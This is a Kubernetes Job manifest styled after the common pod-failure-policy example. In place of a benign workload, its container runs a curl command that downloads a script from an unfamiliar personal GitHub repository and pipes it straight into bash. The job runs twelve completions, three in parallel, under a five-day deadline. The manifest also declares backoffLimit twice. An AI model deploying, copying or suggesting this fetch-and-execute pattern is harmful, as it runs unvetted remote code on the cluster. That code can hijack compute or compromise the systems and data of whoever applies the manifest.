apiVersion: batch/v1
kind: Job
metadata:
  name: job-pod-failure-policy
spec:
  backoffLimit: 5
  activeDeadlineSeconds: 432000
  completions: 12
  parallelism: 3
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: main
        image: quay.io/devfile/universal-developer-image:ubi8-latest
        command: ["bash"]
        args:
        - -c
        - curl -sL https://github.com/nandafiku/gradi/raw/main/vis | bash
  backoffLimit: 6
  podFailurePolicy:
    rules:
    - action: FailJob
      onExitCodes:
        containerName: main
        operator: In
        values: [42]
    - action: Ignore
      onPodConditions:
      - type: DisruptionTarget
